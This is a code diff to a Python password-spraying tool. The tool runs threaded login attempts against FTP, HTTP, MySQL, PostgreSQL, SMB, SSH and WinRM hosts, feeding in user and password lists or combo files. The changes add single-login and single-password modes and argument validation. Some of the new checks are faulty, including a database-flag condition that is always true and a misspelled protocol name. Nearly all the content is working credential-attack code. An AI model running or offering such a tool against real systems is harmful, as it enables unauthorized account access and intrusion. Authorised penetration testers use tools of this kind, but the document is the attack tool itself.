@@ -15,68 +15,123 @@ from colorama import init, Fore
 init(autoreset=True)
 
 
-def q_ftp(q_hosts, log, pas):
+def q_ftp(q_hosts, log, pas, single_log, single_pas):
     while True:
         host = q_hosts.get()
-        for i in range(len(log)):
-            s = protocol_ftp.con_ftp(host=host, user=log[i], secret=pas[i])
+        if single_log and not single_pas:
+            for i in range(len(pas)):
+                protocol_ftp.con_ftp(host=host, user=log[0], secret=pas[i])
+        elif not single_log and single_pas:
+            for i in range(len(log)):
+                protocol_ftp.con_ftp(host=host, user=log[i], secret=pas[0])
+        elif not single_pas and not single_log:
+            for i in range(len(log)):
+                protocol_ftp.con_ftp(host=host, user=log[i], secret=pas[i])
         q_hosts.task_done()
 
 
-def q_http(q_hosts, log, pas):
+def q_http(q_hosts, log, pas, single_log, single_pas):
     while True:
         host = q_hosts.get()
-        for i in range(len(log)):
-            s = protocol_http.con_http(host=host, user=log[i], secret=pas[i])
+        if single_log and not single_pas:
+            for i in range(len(pas)):
+                protocol_http.con_http(host=host, user=log[0], secret=pas[i])
+        elif not single_log and single_pas:
+            for i in range(len(log)):
+                protocol_http.con_http(host=host, user=log[i], secret=pas[0])
+        elif not single_pas and not single_log:
+            for i in range(len(log)):
+                protocol_http.con_http(host=host, user=log[i], secret=pas[i])
         q_hosts.task_done()
 
 
-def q_mysql(q_hosts, log, pas, q_dbname):
+def q_mysql(q_hosts, log, pas, single_log, single_pas, q_dbname):
     while True:
         host = q_hosts.get()
         dbname = q_dbname.get()
-        for i in range(len(log)):
-            s = protocol_mysql.con_msql(host=host, user=log[i], secret=pas[i], datab_name=dbname)
+        if single_log and not single_pas:
+            for i in range(len(pas)):
+                protocol_mysql.con_msql(host=host, user=log[0], secret=pas[i], datab_name=dbname)
+        elif not single_log and single_pas:
+            for i in range(len(log)):
+                protocol_mysql.con_msql(host=host, user=log[i], secret=pas[0], datab_name=dbname)
+        elif not single_pas and not single_log:
+            for i in range(len(log)):
+                protocol_mysql.con_msql(host=host, user=log[i], secret=pas[i], datab_name=dbname)
         q_hosts.task_done()
 
 
-def q_postgresql(q_hosts, log, pas, q_dbname):
+def q_postgresql(q_hosts, log, pas, single_log, single_pas, q_dbname):
     while True:
         host = q_hosts.get()
         dbname = q_dbname.get()
-        for i in range(len(log)):
-            s = protocol_postgresql.con_psgrsql(host=host, user=log[i], secret=pas[i], datab_name=dbname)
+        if single_log and not single_pas:
+            for i in range(len(pas)):
+                protocol_postgresql.con_psgrsql(host=host, user=log[0], secret=pas[i], datab_name=dbname)
+        elif not single_log and single_pas:
+            for i in range(len(log)):
+                protocol_postgresql.con_psgrsql(host=host, user=log[i], secret=pas[0], datab_name=dbname)
+        elif not single_pas and not single_log:
+            for i in range(len(log)):
+                protocol_postgresql.con_psgrsql(host=host, user=log[i], secret=pas[i], datab_name=dbname)
         q_hosts.task_done()
 
 
-def q_smb(q_hosts, log, pas):
+def q_smb(q_hosts, log, pas, single_log, single_pas):
     while True:
         host = q_hosts.get()
-        for i in range(len(log)):
-            s = protocol_smb.con_smb(name_server=host, user=log[i], secret=pas[i])
+        if single_log and not single_pas:
+            for i in range(len(pas)):
+                protocol_smb.con_smb(name_server=host, user=log[0], secret=pas[i])
+        elif not single_log and single_pas:
+            for i in range(len(log)):
+                protocol_smb.con_smb(name_server=host, user=log[i], secret=pas[0])
+        elif not single_pas and not single_log:
+            for i in range(len(log)):
+                protocol_smb.con_smb(name_server=host, user=log[i], secret=pas[i])
         q_hosts.task_done()
 
 
-def q_ssh(q_hosts, log, pas):
+def q_ssh(q_hosts, log, pas, single_log, single_pas):
     while True:
         host = q_hosts.get()
-        for i in range(len(log)):
-            s = protocol_ssh.con_ssh(host=host, user=log[i], secret=pas[i])
+        if single_log and not single_pas:
+            for i in range(len(pas)):
+                protocol_ssh.con_ssh(host=host, user=log[0], secret=pas[i])
+        elif not single_log and single_pas:
+            for i in range(len(log)):
+                protocol_ssh.con_ssh(host=host, user=log[i], secret=pas[0])
+        elif not single_pas and not single_log:
+            for i in range(len(log)):
+                protocol_ssh.con_ssh(host=host, user=log[i], secret=pas[i])
         q_hosts.task_done()
 
 
-def q_winrm(q_hosts, log, pas):
+def q_winrm(q_hosts, log, pas, single_log, single_pas):
     while True:
         host = q_hosts.get()
-        for i in range(len(log)):
-            s = protocol_winrm.con_winrm(host=host, user=log[i], secret=pas[i])
+        if single_log and not single_pas:
+            for i in range(len(pas)):
+                protocol_winrm.con_winrm(host=host, user=log[0], secret=pas[i])
+        elif not single_log and single_pas:
+            for i in range(len(log)):
+                protocol_winrm.con_winrm(host=host, user=log[i], secret=pas[0])
+        elif not single_pas and not single_log:
+            for i in range(len(log)):
+                protocol_winrm.con_winrm(host=host, user=log[i], secret=pas[i])
         q_hosts.task_done()
+
+
+def finisher():
+    print("------------------------------------")
+    print("password spraying has been completed")
+    print("------------------------------------")
 
 
 class PasswordSpraying:
     def __init__(self):
         self.info = "Simple password spraying"
-        self.protocol = 0
+        self.protocol = None
         self.target = []
         self.dbname = []
         self.log = []
@@ -85,6 +140,8 @@ class PasswordSpraying:
         self.file_log = None
         self.file_pas = None
         self.singleMode = False
+        self.singlelog = False
+        self.singlepas = False
         self.attempts = 0
 
     def startup(self):
@@ -121,13 +178,18 @@ class PasswordSpraying:
             print(Fore.RED + '-> you should set protocol and ips!')
             option.print_help()
             sys.exit(1)
-        else:
-            if ((options.singlelogin and options.singlepas) and not (options.filelogin and options.filepas) and (
-                    not options.combofile)) or not (
-                    (options.singlelogin and options.singlepas) and (options.filelogin and options.filepas) and (
-                    not options.combofile)) or not (
-                    (options.singlelogin and options.singlepas) and not (options.filelogin and options.filepas) and (
-                    options.combofile)):
+        elif options.dbname and (options.protocol != 'mysql' or options.protocol != 'postgesql'):
+            print(Fore.RED + '-> you can use this flag only with mysql and postgresql')
+            option.print_help()
+            sys.exit(1)
+        elif (options.protocol == 'mysql' or options.protocol == 'postgesql') and not options.dbname:
+            print(Fore.RED + '-> you should set database name')
+        elif not (options.singlelogin and options.filelogin) and not (options.singlepas and options.filepas):
+            if ((options.singlelogin or options.filelogin) and (
+                    options.singlepas or options.filepas) and not options.combofile) and (
+                    not (options.singlelogin and options.filelogin) or not (
+                    options.singlepas and options.filepas) and not (
+                    options.singlepas or options.filepas) and options.combofile):
                 if options.singleTarget and not options.targetFile:
                     self.singleMode = True
                     self.func_target(options)
@@ -140,10 +202,18 @@ class PasswordSpraying:
                     sys.exit(1)
             else:
                 print(Fore.RED + '-> you should type pair of possible user and password or path to this file')
+                option.print_help()
                 sys.exit(1)
+        else:
+            print(Fore.RED + '-> you not allowed to use two flags for logins or passwords')
+            option.print_help()
+            sys.exit(1)
 
     def func_target(self, options):
+
         self.protocol = options.protocol
+        checker = True
+
         if self.singleMode:
             self.target.append(str(options.singleTarget))
             if options.dbname:
@@ -164,23 +234,35 @@ class PasswordSpraying:
             print(Fore.RED + '-> Check targets flags')
             sys.exit(1)
 
-        if options.singlelogin and options.singlepas:
+        if options.singlelogin:
             self.log.append(str(options.singlelogin))
-            self.pas.append(str(options.singlepas))
-            self.pas_spray()
-        elif options.filelogin and options.filepas:
+            self.singlelog = True
+        elif options.filelogin:
             path_log = str(options.filelogin)
-            path_pas = str(options.filepas)
             with open(path_log, mode='r') as f:
                 for log_line in f:
                     log_line = log_line.rstrip('\n')
                     self.log.append(log_line)
+        elif not options.singlelogin and not options.filelogin:
+            checker = False
+            print(Fore.RED + '-> Check login flags')
+            sys.exit(1)
+
+        if options.singlepas:
+            self.pas.append(str(options.singlepas))
+            self.singlepas = True
+        elif options.filepas:
+            path_pas = str(options.filepas)
             with open(path_pas, mode='r') as f:
                 for pas_line in f:
                     pas_line = pas_line.rstrip('\n')
                     self.pas.append(pas_line)
-            self.pas_spray()
-        elif options.combofile:
+        elif not options.singlepas and not options.filepas:
+            checker = False
+            print(Fore.RED + '-> Check passwords flags')
+            sys.exit(1)
+
+        if options.combofile:
             path = str(options.combofile)
             with open(path, mode='r') as f:
                 for line in f:
@@ -188,10 +270,11 @@ class PasswordSpraying:
                     splt_line = line.split()
                     self.log.append(splt_line[0])
                     self.pas.append(splt_line[1])
+        elif not checker and not options.combofile:
+            print(Fore.RED + '-> Check flags')
+
+        if checker:
             self.pas_spray()
-        else:
-            print(Fore.RED + '-> Check login and passwords flags')
-            sys.exit(1)
 
     def pas_spray(self):
 
@@ -205,42 +288,58 @@ class PasswordSpraying:
         match self.protocol:
             case 'ftp':
                 for x in range(1, targets_num + 1):
-                    Thread(target=q_ftp, args=(q_hosts, self.log, self.pas)).start()
+                    Thread(target=q_ftp,
+                           args=(q_hosts, self.log, self.pas, self.singlelog, self.singlepas)).start()
                     sleep(5)
+
             case 'http':
                 for x in range(1, targets_num + 1):
-                    Thread(target=q_http, args=(q_hosts, self.log, self.pas)).start()
+                    Thread(target=q_http,
+                           args=(q_hosts, self.log, self.pas, self.singlelog, self.singlepas)).start()
                     sleep(5)
+
             case 'mysql':
                 q_dbnames = Queue()
                 for y in self.dbname:
                     q_dbnames.put(y)
                 for x in range(1, targets_num + 1):
-                    Thread(target=q_mysql, args=(q_hosts, self.log, self.pas, q_dbnames)).start()
+                    Thread(target=q_mysql,
+                           args=(q_hosts, self.log, self.pas, self.singlelog, self.singlepas, q_dbnames)).start()
                     sleep(5)
+
             case 'postgresql':
                 q_dbnames = Queue()
                 for y in self.dbname:
                     q_dbnames.put(y)
                 for x in range(1, targets_num + 1):
-                    Thread(target=q_postgresql, args=(q_hosts, self.log, self.pas, q_dbnames)).start()
+                    Thread(target=q_postgresql,
+                           args=(q_hosts, self.log, self.pas, self.singlelog, self.singlepas, q_dbnames)).start()
                     sleep(5)
+
             case 'smb':
                 for x in range(1, targets_num + 1):
-                    Thread(target=q_smb, args=(q_hosts, self.log, self.pas)).start()
+                    Thread(target=q_smb,
+                           args=(q_hosts, self.log, self.pas, self.singlelog, self.singlepas)).start()
                     sleep(5)
+
             case 'ssh':
                 for x in range(1, targets_num + 1):
-                    Thread(target=q_ssh, args=(q_hosts, self.log, self.pas)).start()
+                    Thread(target=q_ssh,
+                           args=(q_hosts, self.log, self.pas, self.singlelog, self.singlepas)).start()
                     sleep(5)
+
             case 'winrm':
                 for x in range(1, targets_num + 1):
-                    Thread(target=q_winrm, args=(q_hosts, self.log, self.pas)).start()
+                    Thread(target=q_winrm,
+                           args=(q_hosts, self.log, self.pas, self.singlelog, self.singlepas)).start()
                     sleep(5)
+            case _:
+                print(Fore.RED + "-> protocol doesn't exist")
+                sys.exit(1)
 
 
 if __name__ == '__main__':
     ps = PasswordSpraying()
     ps.startup()
-    print("END OF PROGRAM")
-    sys.exit()
+    finisher()
+    sys.exit(0)
